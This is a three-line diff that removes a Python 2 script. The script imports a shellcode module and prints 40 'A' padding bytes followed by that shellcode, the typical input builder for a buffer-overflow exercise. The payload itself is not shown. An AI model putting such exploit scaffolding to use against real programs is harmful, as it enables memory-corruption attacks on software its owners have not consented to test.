@@ -1,3 +1,0 @@
-from shellcode import shellcode
-from struct import pack
-print 'A'*40+" "+shellcode+" A"
